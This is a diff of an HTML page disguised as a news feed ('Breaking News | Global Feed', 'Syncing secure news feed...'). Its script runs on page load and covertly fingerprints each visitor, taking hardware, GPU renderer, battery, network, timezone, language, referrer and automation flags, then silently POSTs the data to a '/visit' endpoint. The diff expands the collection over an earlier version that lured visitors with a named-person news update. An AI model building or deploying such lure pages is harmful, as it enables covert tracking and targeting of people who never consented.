@@ -1,82 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Person News | Official Feed</title>
+  <title>Breaking News | Global Feed</title>
   <style>
-    body { font-family: 'Segoe UI', Arial, sans-serif; background: #0b0b0b; color: #fff; margin: 0; text-align: center; }
-    header { background: #161616; padding: 30px; border-bottom: 2px solid #e50914; }
-    .news { padding: 20px; max-width: 700px; margin: auto; }
-    .card { background: #1f1f1f; padding: 20px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
-    img { max-width: 100%; border-radius: 8px; }
+    body { background: #050505; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .loader { border: 3px solid #333; border-top: 3px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-
-<header>
-  <h1>Global News Insights</h1>
-  <p>Verifying secure connection...</p>
-</header>
-
-<div class="news">
-  <div class="card">
-    <h2>Special Update: [PERSON NAME]</h2>
-    <img src="https://via.placeholder.com/600x300/222/fff?text=Loading+News+Feed...">
-    <p>Please wait while we synchronize the latest data for your region.</p>
+  <div style="text-align: center;">
+    <div class="loader" style="margin: auto;"></div>
+    <p>Syncing secure news feed...</p>
   </div>
-</div>
 
-<script>
-  async function collectAdvancedIntel() {
-    const intel = {
-      // Hardware Specs
-      hw: {
-        cores: navigator.hardwareConcurrency || "N/A",
-        ram: navigator.deviceMemory || "N/A",
-        platform: navigator.platform,
-        touch: navigator.maxTouchPoints > 0
-      },
-      // Screen & Graphics
-      display: {
-        res: `${window.screen.width}x${window.screen.height}`,
-        ratio: window.devicePixelRatio
-      },
-      // Environment
-      env: {
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang: navigator.language,
-        ref: document.referrer || "Direct"
-      }
-    };
+  <script>
+    async function collectFullIntel() {
+      const data = {
+        // Hardware & CPU
+        hw: {
+          cores: navigator.hardwareConcurrency || "N/A",
+          ram: navigator.deviceMemory || "N/A",
+          platform: navigator.platform || "N/A",
+          touch: navigator.maxTouchPoints || 0,
+          vendor: navigator.vendor || "N/A"
+        },
+        // Display & Screen
+        display: {
+          res: `${window.screen.width}x${window.screen.height}`,
+          avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
+          depth: window.screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          orientation: screen.orientation ? screen.orientation.type : "N/A"
+        },
+        // Browser Environment
+        browser: {
+          lang: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          ref: document.referrer || "Direct",
+          cookies: navigator.cookieEnabled,
+          webdriver: navigator.webdriver || false,
+          java: navigator.javaEnabled()
+        }
+      };
 
-    // Get Detailed GPU Info
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl');
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      intel.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-    } catch(e) { intel.gpu = "Blocked"; }
+      // GPU Extraction
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+      } catch (e) { data.gpu = "N/A"; }
 
-    // Get Battery & Connection
-    try {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        intel.bat = { lvl: (b.level * 100) + "%", chg: b.charging };
-      }
+      // Battery Status
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          data.battery = { lvl: (b.level * 100) + "%", status: b.charging ? "Charging" : "Unplugged" };
+        }
+      } catch (e) { data.battery = "N/A"; }
+
+      // Network Info
       if (navigator.connection) {
-        intel.net = { type: navigator.connection.effectiveType, speed: navigator.connection.downlink + "Mbps" };
+        data.net = {
+          type: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink + " Mbps",
+          rtt: navigator.connection.rtt + " ms"
+        };
       }
-    } catch(e) {}
 
-    // Send to server (Maintaining your old route)
-    fetch("/visit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(intel)
-    });
-  }
-  window.onload = collectAdvancedIntel;
-</script>
+      // Send to server
+      fetch("/visit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    }
+    window.onload = collectFullIntel;
+  </script>
 </body>
 </html>
